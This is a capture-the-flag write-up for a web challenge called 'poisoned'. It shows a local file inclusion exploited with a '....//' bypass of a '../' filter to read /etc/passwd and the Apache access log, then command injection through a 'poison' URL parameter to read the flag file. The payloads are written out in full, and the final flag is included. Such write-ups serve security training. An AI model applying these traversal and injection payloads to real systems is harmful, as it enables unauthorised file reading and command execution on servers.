# poisoned
### Description
> Seems these pesky AI hackers are up to no good again! You must find out how where they POISONED this site and use that to find the file they placed on our web server!

### Writeup
As the website is having `page` as parameter, we can clearly say it is having `lfi`. So I have tried using simple `../../../../etc/passwd` payload, but it did not work. Maybe, there is some kind of filter for `../` on server, that is why, next thing to try is `....//`, if there is filter for `../` then it will be converted like `....//` -> `../`

![](https://i.imgur.com/FGvyDb8.png)
And yes, the payload is executed.

Moreover, in this CTF, we always get hint from challenge title, here it is `poisoined`, therefore `log poisoining`. Let's check apache logs.

![](https://i.imgur.com/OQd6hkq.png)

Ah, interesting, it is saying we have to add `poison` as parameter in url, like this.

`https://jerseyctf-poisoned.chals.io/?poison=ls&page=....//....//....//....//../var/log/apache2/access.log`

So, we conclude that, it is having `lfi` as well as `command injection`.

![](https://i.imgur.com/YjGnDvq.png)

And boom we got the flag on this url - `https://jerseyctf-poisoned.chals.io/?poison=cat%20../../../secret_fl4g.txt&page=....//....//....//....//../var/log/apache2/access.log`

Flag: `jctf{4PachE_L0G_POiS0nInG}`